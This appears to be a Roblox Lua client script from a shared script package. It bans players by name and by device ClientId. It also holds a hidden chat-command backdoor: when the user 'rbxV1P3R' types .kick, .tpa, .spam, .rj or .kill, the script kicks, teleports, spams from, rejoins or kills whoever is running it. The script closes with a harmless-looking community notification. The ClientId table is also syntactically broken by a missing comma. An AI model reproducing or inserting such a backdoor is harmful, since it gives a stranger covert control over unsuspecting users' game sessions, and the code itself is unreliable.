local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

-- Lista de jogadores proibidos pelo nome
local bannedPlayers = {
  "rbxV1P3R"
}

-- Lista de ClientIds banidos
local bannedClientIds = {
  "0C2B36C2-6E7B-4D52-B4C3-8E9DD9A1C8F3",
  "665B0C37-7E22-4FB4-941D-D346FDAC97E4",
  "24c17f55-48fe-42a4-ad6d-55a15481d2f9", --ErasedGoldenRobot
  "62132B9A-D55B-47A2-8710-EC0D976D6B6D"
  "e23c5bed-d7d5-4806-be85-75d9f56d4c83"
}

local function checkAndKick(player)
    local playerName = player.Name
    local clientId = RbxAnalyticsService:GetClientId()

    if table.find(bannedPlayers, playerName) or table.find(bannedClientIds, clientId) then
        player:Kick("You are permanently BANNED. by V1P3R")
    end
end

Players.PlayerAdded:Connect(function(player)
    task.wait(1)
    checkAndKick(player)
end)

for _, player in ipairs(Players:GetPlayers()) do
    task.wait(1)
    checkAndKick(player)
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = Players.LocalPlayer

local monitoredPlayer = "rbxV1P3R"
local spamActive = false
local spamCoroutine

game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(messageData)
    local message = messageData.Message
    local speaker = Players:GetPlayerByUserId(messageData.SpeakerUserId)

    if speaker and speaker.Name == monitoredPlayer then
        if message:lower() == ".kick" then
            for _, player in pairs(Players:GetPlayers()) do
                if player == Player then
                    Player:Kick("you got kicked loser! by V1P3R")
                end
            end
        elseif message:lower() == ".tpa" then
            for _, player in pairs(Players:GetPlayers()) do
                if player == Player then
                    player.Character:SetPrimaryPartCFrame(speaker.Character.HumanoidRootPart.CFrame)
                end
            end
        elseif message:lower() == ".spam" then
            if not spamActive then
                spamActive = true
                spamCoroutine = coroutine.create(function()
                    while spamActive do
                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("V1P3R on top!", "All")
                        wait(0)
                    end
                end)
                coroutine.resume(spamCoroutine)
            end
        elseif message:lower() == ".unspam" then
            if spamActive then
                spamActive = false
                if spamCoroutine then
                    coroutine.close(spamCoroutine)
                end
            end
        elseif message:lower() == ".rj" then
            game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
        elseif message:lower() == ".kill" then
            if Player.Character and Player.Character:FindFirstChild("Humanoid") then
                Player.Character.Humanoid.Health = 0
            end
        end
    end
end)

local StarterGui = game:GetService("StarterGui")

StarterGui:SetCore("SendNotification", {
    Title = "Join the Server",
    Text = "Join the server to stay up to date with updates and be part of our community",
    Duration = 10,
    Button1 = "OK"
})
